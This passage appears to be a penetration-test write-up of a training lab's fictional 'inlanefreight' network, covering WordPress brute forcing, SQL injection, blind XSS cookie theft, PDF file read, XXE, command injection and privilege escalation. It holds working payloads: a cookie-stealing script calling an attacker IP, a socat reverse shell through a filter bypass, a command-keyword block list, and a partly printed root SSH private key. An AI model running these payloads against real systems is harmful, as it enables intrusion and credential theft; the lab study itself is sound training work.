[+] Data Sent: 16.76 KB
[+] Data Received: 384.211 KB
[+] Memory used: 216.148 MB
[+] Elapsed time: 00:00:23
```

It extracts several wordpress users. I saved it to `wp-users.txt`.
With this usernames, I tried brute-force attack using `wpscan`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sudo wpscan --url http://ir.inlanefreight.local -U wp-users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt

<SNIP>

[+] Performing password attack on Xmlrpc against 4 user/s
[SUCCESS] - ilfreightwp / password1
Trying john / soccer10 Time: 00:05:05 <============     > (3005 / 4004) 75.04%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Dec 25 12:49:01 2024
[+] Requests Done: 3151
[+] Cached Requests: 37
[+] Data Sent: 1.469 MB
[+] Data Received: 2.122 MB
[+] Memory used: 306.883 MB
[+] Elapsed time: 00:05:22
```

Here I could find one valid credential : `ilfreightwp` : `password1`

![](attachments/aen_20.png)

With the found credential, I can login to the admin panel.
Once I have an access to wp-admin panel, the most go-to method is creating a reverse shell with Theme File Editor.

![](attachments/aen_21.png)

I can fetch the page with `curl` command.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php
```

And I was waiting on listener.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.50] from (UNKNOWN) [10.129.67.59] 60858
Linux 7635d7d77b7b 5.4.0-113-generic #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 GNU/Linux
 18:16:29 up 44 min,  0 users,  load average: 0.02, 0.14, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Here I opened a shell!
I checked its IP address with `hostname -I` command to figure out if it has internal network interface.

```bash
$ hostname -I
172.18.0.12 
```

It needs to be reported since it also has a critical RCE vulnerability.
It has only a single internal IP which means it's also just an isolated system.

##### status.inlanefreight.local

![](attachments/aen_22.png)

It looks like a logging page which is not supposed to be open to public.

![](attachments/aen_23.png)

I randomly feed single alphabet characters to see how the page reacts, and it returns logs of which `Event` field contains the query.

In this case, this might be vulnerable to SQL Injection attack.
I captured a request through `Burpsuite`.

```http
POST / HTTP/1.1
Host: status.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://status.inlanefreight.local
Connection: keep-alive
Referer: http://status.inlanefreight.local/
Cookie: PHPSESSID=c500ok6se5mbs2untlpcpr85oi
Upgrade-Insecure-Requests: 1

searchitem=b
```

Then I used it on `sqlmap` to see if it's injectable.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r status.req --batch --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=b%' AND 3371=3371#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=b%' AND GTID_SUBSET(CONCAT(0x716a707871,(SELECT (ELT(1848=1848,1))),0x716b626b71),1848) AND 'YKZs%'='YKZs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=b%' AND (SELECT 9489 FROM (SELECT(SLEEP(5)))xmJn) AND 'QQUe%'='QQUe

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: searchitem=b%' UNION ALL SELECT NULL,CONCAT(0x716a707871,0x7763576855464857754c48576449625057565177614f6943746e77417a7049674e6e77436d446f66,0x716b626b71),NULL,NULL#
---
[13:31:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[13:31:05] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

[13:31:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local'                                                              

[*] ending @ 13:31:05 /2024-12-25/
```

It is vulnerable to SQL Injection attack. And initially it retrieves all existing databases.
Let me extract more information.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r status.req --batch -D status --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org 

<SNIP>

[13:35:58] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+

[13:35:59] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local'                                                              

[*] ending @ 13:35:59 /2024-12-25/


┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r status.req --batch -D status -T users --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org          

<SNIP>

[13:36:52] [INFO] fetching entries for table 'users' in database 'status'
Database: status
Table: users
[2 entries]
+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+

[13:36:53] [INFO] table '`status`.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local/dump/status/users.csv'                                      
[13:36:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/status.inlanefreight.local'                                                              

[*] ending @ 13:36:53 /2024-12-25/



┌──(kali㉿kali)-[~/htb]
└─$ sqlmap -r status.req --batch -D status -T company --dump

<SNIP>

[13:37:41] [INFO] fetching entries for table 'company' in database 'status'
Database: status
Table: company
[6 entries]
+----+-------------+--------+--------------+
| id | city        | rating | company_name |
+----+-------------+--------+--------------+
| 1  | Washington  | 9      | Shiprocket   |
| 2  | Springfield | 8      | Delhivery    |
| 3  | Franklin    | 9      | Gati         |
| 4  | Greenville  | 7      | Ecom Express |
| 5  | Bristol     | 9      | FedEx        |
| 6  | Fairview    | 8      | Blue Dart    |
+----+-------------+--------+--------------+
```

As we observed, this SQL Injection vulnerability allows us to dump all data from the database.
I extracted password of `Admin` : `4528342e54d6f8f8cf15bf6e3c31bf1f6`,
And also I fetched a list of companys' rating which might be sensitive in some cases.

This should be reported as critical.

##### support.inlanefreight.local

![](attachments/aen_24.png)

This looks like a company's support center website which is supposed to be open to public.
There's a single valid link "Contact Us".

![](attachments/aen_25.png)

Since it has many user inputs, possibly it contains XSS vulnerability vectors.
Here's the reference HTB module:
https://academy.hackthebox.com/module/103/section/1008

![](attachments/aen_26.png)

Given a few payloads provided from the module, I tested on "Message" field.

```xml
"><script src=http://10.10.14.50:8000/this_is_a_test></script>
```

With a listener, I can see that the code above triggers remote connection from the target.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.67.59 - - [25/Dec/2024 14:09:47] code 404, message File not found
10.129.67.59 - - [25/Dec/2024 14:09:47] "GET /this_is_a_test HTTP/1.1" 404 -
```

Since it's vulnerable to Blind XSS, I can use `index.php`, `script.js`, and `XSS payload` to exploit it to obtain cookie values.

```php
# index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```javascript
// script.js
new Image().src='http://10.10.14.50:9200/index.php?c='+document.cookie
```

```bash
# Command to open php server
sudo php -S 0.0.0.0:9200
```

```javascript
// XSS payload
"><script src=http://10.10.14.50:9200/script.js></script>
```

And I got the following log;

```bash
┌──(kali㉿kali)-[~/htb]
└─$ sudo php -S 0.0.0.0:9200
[sudo] password for kali: 
[Wed Dec 25 14:17:43 2024] PHP 8.2.21 Development Server (http://0.0.0.0:9200) started
^A[Wed Dec 25 14:17:59 2024] 10.129.67.59:52118 Accepted
[Wed Dec 25 14:17:59 2024] 10.129.67.59:52118 [200]: GET /script.js
[Wed Dec 25 14:17:59 2024] 10.129.67.59:52118 Closing
[Wed Dec 25 14:17:59 2024] 10.129.67.59:52120 Accepted
[Wed Dec 25 14:17:59 2024] 10.129.67.59:52120 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99                                                                            
[Wed Dec 25 14:17:59 2024] 10.129.67.59:52120 Closing
[Wed Dec 25 14:18:03 2024] 10.129.67.59:52138 Accepted
[Wed Dec 25 14:18:03 2024] 10.129.67.59:52138 [200]: GET /script.js
[Wed Dec 25 14:18:03 2024] 10.129.67.59:52138 Closing
[Wed Dec 25 14:18:04 2024] 10.129.67.59:52142 Accepted
[Wed Dec 25 14:18:04 2024] 10.129.67.59:52142 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99                                                                            
[Wed Dec 25 14:18:04 2024] 10.129.67.59:52142 Closing
```

It's capturing someone's session key value : `fcfaf93ab169bc943b92109f0a845d99`.
Let's set this to our browser and see who is it.

![](attachments/aen_27.png)

Then, when I go to Login page, I can see the following which implies that the attack works.

![](attachments/aen_28.png)

##### tracking.inlanefreight.local

![](attachments/aen_29.png)

It looks like a shipping tracking website.
Let's try using the shipping tracking function with random number.

![](attachments/aen_30.png)

Then it's creating a pdf-look document with our input.
While playing with this input, I figured out that the system is not sanitizing or filtering non-digit chracters, and even allows html code injection.

- TEXT INPUT -> TEXT INPUT
- `<h1>HTML INPUT</h1>` -> HTML INPUT(h1 size)

Regarding this, here's the references explaining how to exploit this;
- https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f
- https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/

Here's a payload to read a file from the server.

```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){  
document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

When I send this as tracking number input, it returns the following;

![](attachments/aen_31.png)

It returns `/etc/passwd` from the target system.
We can report it as one another critical vulnerability **SSRF to Local File Read**.

##### vpn.inlanefreight.local

![](attachments/aen_32.png)

It returns a login page. This might be super useful if we know any valid credential since the vpn might allow us to the internal system.
Of course, this type of service for the employees is supposed to be actively in operation, and set a decent complicated credentials.
I tested with some easy credentials but the access was denied.

![](attachments/aen_33.png)

I can revisit it later if we have any valid credential.

##### gitlab.inlanefreight.local

![](attachments/aen_34.png)

It looks like a company's internal gitlab which is not supposed to be open to public.
It even allows registering new user. Let's try this.

After sign-in, I was able to read several existing repositories.

![](attachments/aen_35.png)

This repositories allows implies that there is an extra domain named `shopdev2` that we didn't find from previous enumeration. Let's add this to `/etc/hosts` and visit later.
Since the description says it's an online store which is in development, there might be vulnerabilities.

`monitoring.inlanefreight.local` is already in the domain list.

I inspected all repositories to find if there's any stored credential, but it was not successful.

##### shopdev2.inlanefreight.local

![](attachments/aen_36.png)

It's redirected to a login page. Since the target is in development, I can possibly guess that easy credentials might be working. I tried `admin`:`admin`, and it worked!

I enumerate through the website and got to `cart.php` page.
I tried to check out the current items in the cart, but it says the function is not implemented.

![](attachments/aen_37.png)

Since the function is not implemented, I guessed that there might be some weak point.
Let's capture the request when clicking "Complete Purchase".

```xml
POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 102
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=l6gm283sk3gs9ikfo91bg8i35p

<?xml version="1.0" encoding="UTF-8"?><root><subtotal>undefined</subtotal><userid>1206</userid></root>
```

This request contains XML data. Let me try XXE Injection here.

![](attachments/aen_38.png)

This one worked, and I could successfully retrieve local files.
Need to add **XML External Entity (XXE) Injection** as a vulnerability found here.

##### monitoring.inlanefreight.local

![](attachments/aen_39.png)

This seems to be a IT only web which is still accessible.
It's controlled with authentication. And no other useful vectors found.

I tried brute-forcing as follows;

```bash
┌──(kali㉿kali)-[~/htb]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-25 21:01:18
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials
[STATUS] 790.00 tries/min, 790 tries in 00:01h, 14343609 to do in 302:37h, 16 active
[STATUS] 833.33 tries/min, 2500 tries in 00:03h, 14341899 to do in 286:51h, 16 active
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-25 21:05:41
```

The extracted credential is `admin`:`12qwaszx`!
Let's try logging-in.

![](attachments/aen_40.png)

It's redirected to a terminal-look webapp.
While trying all existing commands, I tried to monitor if there's any command triggers network connection. And I found `connection_test` command, which triggers request.

```http
GET /ping.php?ip=127.0.0.1 HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: keep-alive
Referer: http://monitoring.inlanefreight.local/index.php
Cookie: PHPSESSID=kqftb6led4aoe9112jvnsujsh5
```

The request strongly implies that this is possibly vulnerable to command injection attack since it's using `ping` command apparently.

Here's the module explaining command injection attack:
https://academy.hackthebox.com/module/109/section/10306

The guessed command line would be;
```
ping {user input}
```

First, let's try different command concatenator;
`;` returns an error "Invalid input" which implies that there's a filter.
So do `&&` and `|`.

I tried `%0a`, and it worked! But when I appended `id` command after that, it returns "Invalid input" again.

Given `cat` command is working, I think there's a filter filtering common commands.

This reference shows how to escape from this;
https://academy.hackthebox.com/module/109/section/1038

I tried `'i'd` command and it worked!
This means that I can even open a reverse shell through this vulnerability!
I additionally tried `'i'fconfig` to see network interfaces.

```bash
br-65c448355ed2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::42:a4ff:fe85:939e  prefixlen 64  scopeid 0x20<link>
        ether 02:42:a4:85:93:9e  txqueuelen 0  (Ethernet)
        RX packets 7569  bytes 18261117 (18.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12254  bytes 2612480 (2.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:d5ff:fe50:22b4  prefixlen 64  scopeid 0x20<link>
        ether 02:42:d5:50:22:b4  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7  bytes 690 (690.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.147  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb0:c480  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb0:c480  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:c4:80  txqueuelen 1000  (Ethernet)
        RX packets 125567  bytes 10836535 (10.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 54497  bytes 29051418 (29.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb0:b37e  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:b3:7e  txqueuelen 1000  (Ethernet)
        RX packets 2070  bytes 134483 (134.4 KB)
        RX errors 0  dropped 59  overruns 0  frame 0
        TX packets 74  bytes 6436 (6.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
<SNIP>
```

Yay! It returns multiple network adapter. I can hopefully pivot through this!
I guess that `ens192` of which IP is `172.16.8.120` might be the vector to pivot through.

To identify all filters, let's try to read `ping.php` file with the following payload : `%0acat${IFS}ping.php` (`${IFS}` replaces space!)

```php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }
  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_GET['ip'])) {
  $ip = $_GET['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
<?php
echo $output;
?>
```

It's filtering most commands, but I observed that `socat` command is not in the filter list.
Let's open a reverse shell through this.

Here's the modified request to spawn a reverse shell.

```http
GET /ping.php?ip=127.0.0.1%0asocat${IFS}TCP:10.10.14.50:9000${IFS}EXEC:sh HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: keep-alive
Referer: http://monitoring.inlanefreight.local/index.php
Cookie: PHPSESSID=kqftb6led4aoe9112jvnsujsh5
```

Let's capture this through netcat listener.

```sql
┌──(kali㉿kali)-[~/htb]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.50] from (UNKNOWN) [10.129.229.147] 42772
id             
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

I got a `webdev`'s shell!

---

# DMZ & Pivoting

### Privilege Escalation to `srvadm`

To monitor the server log, let's use `aureport`.

```bash
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less
aureport --tty | less
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
8. 06/01/22 07:13:36 365 1004 ? 4 sh "exit",<nl>
```

After running the command, type `q` to return to our shell. From the above output, it looks like a user was trying to authenticate as the `srvadm` user, and we have a potential credential pair `srvadm`:`ILFreightnixadm!`. Using the `su` command, we can authenticate as the `srvadm` user.

I think I can use this credential to login through `ssh`.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ssh srvadm@inlanefreight.local
The authenticity of host 'inlanefreight.local (10.129.229.147)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'inlanefreight.local' (ED25519) to the list of known hosts.
srvadm@inlanefreight.local's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 26 Dec 2024 03:09:25 AM UTC

  System load:                      0.0
  Usage of /:                       92.9% of 13.72GB
  Memory usage:                     65%
  Swap usage:                       0%
  Processes:                        458
  Users logged in:                  0
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.229.147
  IPv6 address for ens160:          dead:beef::250:56ff:feb0:c480
  IPv4 address for ens192:          172.16.8.120

  => / is using 92.9% of 13.72GB


82 updates can be applied immediately.
16 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
```

It worked!

### Privilege Escalation to `root`

Let's enumerate with `linpeas`.

```shell
$ ./linpeas_linux_amd64

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version              
Sudo version 1.8.31        


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                           
[+] [CVE-2022-2586] nft_object UAF                                                           

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid             
Matching Defaults entries for srvadm on dmz01:                                               
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl


╔══════════╣ Last time logon each user
Username         Port     From             Latest                                            
root             tty1                      Fri Mar  8 09:55:50 +0000 2024
lab_adm          pts/0    10.129.202.106   Tue May 31 11:31:49 +0000 2022
srvadm           pts/1    10.10.14.50      Thu Dec 26 03:09:28 +0000 2024
webdev           pts/0    10.129.202.106   Wed Jun  1 07:12:53 +0000 2022
```

It says that I can use `sudo` with `openssl` command.
Let's search it on `GTFOBins`.

I tried `sudo` tab to spawn a reverse shell, but it was not working.
Instead, let's try finding `root`'s RSA private key using `FILE READ` tab.

```bash
$ LFILE=/root/.ssh/id_rsa
$ sudo /usr/bin/openssl enc -in "$LFILE"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
i7l59D31mLOUUKZxYpsciHflfDyCJ79siXXbsZSp5ZUvBOto6JF20Pny+6T0lovwNCiNEz
7avg7o/77lWsfBVEphtPQbmTZwke1OtgvDqG1v4bDWZqKPAAMxh0XQxscpxI7wGcUZbZeF
9OHCWjY39kBVXObER1uAvXmoJDr74/9+OsEQXoi5pShB7FSvcALlw+DTV6ApHx239O8vhW
/0ZkxEzJjIjtjRMyOcLPttG5zuY1f2FBt2qS1w0VAAAFgIqVwJSKlcCUAAAAB3NzaC1yc2
EAAAGBANJLF4CCx0W9I9bN6WR/LPxBWHsEnm6BIuBpEaIHUedxll3qexiTCKMbl02mJDEh
RvQpYo9V+nK5HFi50i7iiPCkual7LjViErfk9W6b035hcpgyFjceHn0f2KGr6V8fsk/zNl
/W6B6WR5brkfWIhgzGZa92+IQEZG0AHNJeulA/jQfQYx96v5C/OK0QEjGfPMto1MJke+VM
P8JmcXlQ+RPsiRrlnfhJaaFrQ1us3p2X+m6kktlcC4W67N88iQFxtXhrBnuou5efQ99Ziz
lFCmcWKbHIh35Xw8gie/bIl127GUqeWVLwTraOiRdtD58vuk9JaL8DQojRM+2r4O6P++5V
rHwVRKYbT0G5k2cJHtTrYLw6htb+Gw1maijwADMYdF0MbHKcSO8BnFGW2XhfThwlo2N/ZA
VVzmxEdbgL15qCQ6++P/fjrBEF6IuaUoQexUr3AC5cPg01egKR8dt/TvL4Vv9GZMRMyYyI
7Y0TMjnCz7bRuc7mNX9hQbdqktcNFQAAAAMBAAEAAAGATL2yeec/qSd4qK7D+TSfyf5et6
Xb2x+tBo/RK3vYW8mLwgILodAmWr96249Brdwi9H8VxJDvsGX0/jvxg8KPjqHOTxbwqfJ8
OjeHiTG8YGZXV0sP6FVJcwfoGjeOFnSOsbZjpV3bny3gOicFQMDtikPsX7fewO6JZ22fFv
YSr65BXRSi154Hwl7F5AH1Yb5mhSRgYAAjZm4I5nxT9J2kB61N607X8v93WLy3/AB9zKzl
avML095PJiIsxtpkdO51TXOxGzgbE0TM0FgZzTy3NB8FfeaXOmKUObznvbnGstZVvitNJF
FMFr+APR1Q3WG1LXKA6ohdHhfSwxE4zdq4cIHyo/cYN7baWIlHRx5Ouy/rU+iKp/xlCn9D
